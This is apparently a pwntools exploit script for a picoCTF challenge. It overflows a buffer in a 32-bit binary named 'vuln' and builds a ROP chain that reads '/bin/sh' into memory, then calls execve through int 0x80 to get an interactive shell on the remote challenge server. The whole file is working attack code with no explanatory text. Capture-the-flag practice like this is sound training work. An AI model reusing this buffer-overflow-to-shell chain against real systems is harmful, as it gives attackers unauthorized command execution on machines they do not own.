from pwn import *

context.log_level = 'debug'
elf = context.binary = ELF('./vuln')
context.terminal = 'kitty'

writable = 0x80e5000

offset = 28

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.call(elf.sym.read, [0, writable, 0x200])

rop.raw(rop.find_gadget(['pop eax', 'ret'])[0])
rop.raw(0x0b)
rop.raw(rop.find_gadget(['pop edx', 'pop ebx', 'ret'])[0])
rop.raw(0)
rop.raw(writable)
rop.raw(rop.find_gadget(['pop ecx', 'ret'])[0])
rop.raw(0)
rop.raw(rop.find_gadget(['int 0x80'])[0])

print(rop.dump())

p = remote('saturn.picoctf.net', 59453)
# gdb.attach(p, gdbscript='break main')

p.sendlineafter('\n', rop.chain())
p.sendline(b'/bin/sh\x00')

p.interactive()

